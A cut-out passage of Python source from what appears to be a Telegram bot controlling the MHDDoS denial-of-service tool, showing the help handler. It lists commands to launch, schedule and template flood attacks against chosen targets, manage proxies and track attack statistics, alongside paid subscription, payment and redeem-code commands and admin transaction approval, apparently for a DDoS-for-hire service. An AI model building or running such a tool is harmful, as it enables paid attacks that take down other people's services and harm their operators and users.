    user_id = update.effective_user.id
    user = users.get_user(user_id)
    
    if not user and user_id != AUTHORIZED_USER_ID:
        users.add_user(
            user_id,
            update.effective_user.username or "Unknown",
            update.effective_user.first_name or "Unknown"
        )
    
    # Check if user is admin
    is_admin = users.is_user_admin(user_id) or user_id == AUTHORIZED_USER_ID
    
    # Core commands for all users
    command_text = (
        "MHDDoS Telegram Controller Bot\n\n"
        "Commands:\n"
        "/attack [target] [method] [threads] [duration] - Start an attack\n"
        "/stop - Stop all running attacks\n"
        "/status - Show running attacks\n"
        "/methods - List available attack methods\n"
        "/proxy [http/socks4/socks5] [url] - Add proxies\n"
        "/templates - List attack templates\n"
        "/template_info [name] - Show template details\n"
        "/create_template [name] [target] [method] [threads] [duration] [description] - Create a template\n"
        "/run_template [name] - Run an attack template\n"
        "/delete_template [name] - Delete a template\n"
        "/schedule [target] [method] [threads] [duration] [time] - Schedule an attack\n"
        "/schedule_template [name] [time] - Schedule an attack using a template\n"
        "/schedules - List scheduled attacks\n"
        "/cancel_schedule [id] - Cancel a scheduled attack\n"
        "/stats - View attack statistics\n"
        "/daily_stats - View daily attack statistics\n"
    )
    
    # User-specific subscription commands
    subscription_text = (
        "\nSubscription Commands:\n"
        "/plans - View available subscription plans\n"
        "/subscription - View your subscription details\n"
        "/payment - View payment options\n"
        "/redeem [code] - Redeem a subscription code\n"
        "/purchase [plan_id] [payment_method] [payment_id] - Record a purchase\n"
        "/history - View your attack history\n"
    )
    
    # Admin-specific commands
    admin_text = (
        "\nAdmin Commands:\n"
        "/admin_help - View admin commands\n"
        "/admin_users - List all users\n"
        "/admin_user [user_id] - View user details\n"
        "/admin_transactions - View pending transactions\n"
        "/admin_approve [transaction_id] [note] - Approve a transaction\n"
        "/admin_reject [transaction_id] [reason] - Reject a transaction\n"
        "/admin_plans - List all subscription plans\n"
        "/admin_generate_codes [plan_id] [count] - Generate redeem codes\n"
    )
    
    # Combine command sections based on user role
    full_text = command_text
    
    if user_id != AUTHORIZED_USER_ID:
        full_text += subscription_text
    
    if is_admin:
        full_text += admin_text
    
    await update.message.reply_text(full_text)

if __name__ == "__main__":
    # Import asyncio here to avoid circular imports
    import asyncio
    main() 